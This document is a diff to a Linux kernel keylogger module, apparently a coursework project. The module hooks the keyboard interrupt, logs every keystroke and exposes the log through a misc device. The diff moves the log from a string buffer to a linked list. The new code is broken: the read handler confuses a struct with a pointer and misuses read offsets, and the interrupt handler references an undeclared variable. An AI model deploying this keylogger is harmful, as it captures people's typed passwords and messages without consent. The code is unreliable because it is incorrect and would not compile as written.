@@ -1,19 +1,4 @@
 // SPDX-License-Identifier: GPL-2.0+
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/string.h>
-#include <linux/device.h>
-#include <linux/usb.h>
-#include <linux/mod_devicetable.h>
-#include <linux/miscdevice.h>
-#include <linux/uaccess.h>
-#include <linux/errno.h>
-#include <linux/vmalloc.h>
-#include <linux/interrupt.h>
-#include <linux/time.h>
-#include <linux/timekeeping.h>
-#include <linux/slab.h>
-#include <asm/io.h>
 #include "keylogger.h"
 
 MODULE_AUTHOR("hsmits & sel-melc");
@@ -27,42 +12,28 @@ extern struct key_info scancode_to_key[SCANCODE_ARRAY_SIZE];
 
 typedef struct keylogger_data
 {
-	char *log_buffer;
+	t_entry_lst *entry_lst;
 }			   t_keylogger_data;
 
 t_keylogger_data keylogger_data;
 
-/*
-*  Adds a new entry to the log_buffer.
-*/
-
-static int add_new_entry(char *entry)
-{
-	char *tmp_buff;
-	size_t alloc_size = keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1;
-	if (!(tmp_buff = kmalloc(alloc_size, GFP_ATOMIC)))
-	{
-		if (keylogger_data.log_buffer)
-			kfree(keylogger_data.log_buffer);
-		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
-		return (1);
-	}
-	memset(tmp_buff, 0, alloc_size);
-	if (keylogger_data.log_buffer)
-	{
-		strcpy(tmp_buff, keylogger_data.log_buffer);
-		kfree(keylogger_data.log_buffer);
-	}
-	strcat(tmp_buff, entry);
-	keylogger_data.log_buffer = tmp_buff;
-	return (0);
-}
 
 static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
 {
-	if (!keylogger_data.log_buffer)
+	t_entry_lst lst = keylogger_data.entry_lst;
+	size_t cread = 0;
+	ssize_t ret = 0;
+
+	if (!lst)
 		return (0);
-	return simple_read_from_buffer(to, size, _offset, keylogger_data.log_buffer, strlen(keylogger_data.log_buffer));
+	while (lst)
+	{
+		if ((ret = simple_read_from_buffer(to + cread, size, _offset, lst->entry, strlen(lst->entry))) < 0)
+			return ret;
+		cread += strlen(lst->entry);
+		lst = lst->next;
+	}
+	return ret;
 }
 
 
@@ -154,15 +125,14 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
 	log_line[strlen(log_line)] = '\n'; //add a newline at end of our log entry
-	printk(KERN_INFO "%p\n", keylogger_data.log_buffer);
-	add_new_entry(log_line);
+	add_entry(&(logs->entry_lst), log_line);
 	return IRQ_HANDLED;
 }
 
 static int __init init(void)
 {
 	misc_register(&misc_dev);
-	keylogger_data.log_buffer = NULL;
+	keylogger_data.entry_lst = NULL;
 
 	if (request_irq(1, keylogger_handle, IRQF_SHARED, "keylogger", &keylogger_data) < 0)
 	{
@@ -176,8 +146,8 @@ static void __exit cleanup(void)
 {
 	misc_deregister(&misc_dev);
 	free_irq(1, &keylogger_data);
-	if (keylogger_data.log_buffer)
-		kfree(keylogger_data.log_buffer);
+	if (keylogger_data.entry_lst)
+		del_lst(keylogger_data.entry_lst);
 }
 
 module_init(init);
